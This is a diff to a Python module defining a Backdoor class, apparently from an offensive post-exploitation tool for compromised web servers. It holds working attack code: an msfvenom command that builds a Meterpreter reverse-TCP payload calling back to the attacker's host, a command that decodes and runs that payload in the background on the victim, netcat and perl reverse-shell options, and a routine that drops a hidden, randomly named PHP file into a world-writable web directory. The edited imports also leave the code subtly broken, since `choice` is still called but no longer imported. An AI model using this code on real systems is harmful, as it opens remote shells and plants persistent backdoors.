@@ -1,9 +1,8 @@
-import string
-
+from platform import platform as os
 from subprocess import Popen, PIPE
-from random import choice
-from base64 import b64encode
-from itertools import product
+
+import random, string
+import base64, itertools
 
 from core.libs.menu import Colors, getargs
 from core.libs.request_handler import make_request
@@ -23,6 +22,7 @@ class Backdoor(object):
         #print '[i] \t*bash   \t\tUse bash to create a reverse shell (not all versions of bash support this!)'
         #print '[i] \t*java   \t\tUse java to create a reverse shell'
         print '[i] \t*msf    \t\tUse a linux metereter to create a reverse shell'
+        #print '[i] \t*msf-php    \t\tUse a PHP metereter to create a reverse shell'
         print '[i] \t*netcat \t\tUse netcat traditional to create a reverse shell (not netcat OpenBSD)'
         print '[i] \t*perl   \t\tUse perl to create a reverse shell'
         print '[i] \tphp    \t\t\tAttempt to write a PHP file into the web root directory'
@@ -44,7 +44,6 @@ class Backdoor(object):
                 path = '{0}/{1}'.format(folder, filename)
                 raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
                 print '[i] Generating linux/x86/meterpreter/reverse_tcp'
-                #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                 shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
                 cmd = 'echo "{0}" | base64 -i -d > {1} && chmod +x {1} && nohup {1} &'.format(shell, path)
                 print '{0}[+] Sending payload & executing{1}'.format(Colors.GREEN, Colors.END)
@@ -73,6 +72,7 @@ class Backdoor(object):
         else:
             print '\n{0}[!] Didn\'t find netcat on the remote system{1}'.format(Colors.RED, Colors.END)
 
+
     def perl(self, ip, port):
         cmd = "for x in `whereis perl`; do file $x | grep executable | awk '{print $1}' | tr -d ':'; done"
         perl = make_request.get_page_source(cmd)
@@ -98,12 +98,12 @@ class Backdoor(object):
 
     def php(self, ip, ourIP):
         wwwroot = linux.get_doc_root()
-        cmd = 'find {0} -depth -perm -0002 -type d | sort -R | head -n 1'.format(wwwroot)       # Ths could be put into a function? this/spread/get_writble_dir
+        cmd = 'find {0} -depth -perm -0002 -type d | sort -R | head -n 1'.format(wwwroot)
         folder = make_request.get_page_source(cmd)
         if folder:
             folder = folder[0]
             print '\n{0}[+] Found a writable directory: \'{1}\'{2}'.format(Colors.GREEN, folder, Colors.END)
-            filename = '.' + ''.join(choice(string.ascii_letters + string.digits) for x in range(8)) + '.php'     # Ths could be put into a function? Snap! (<--with msf)
+            filename = '.' + ''.join(choice(string.ascii_letters + string.digits) for x in range(8)) + '.php'
             print '{0}[+] Filename: \'{1}\'{2}'.format(Colors.GREEN, filename, Colors.END)
             location = '{0}/{1}'.format(folder, filename)
 
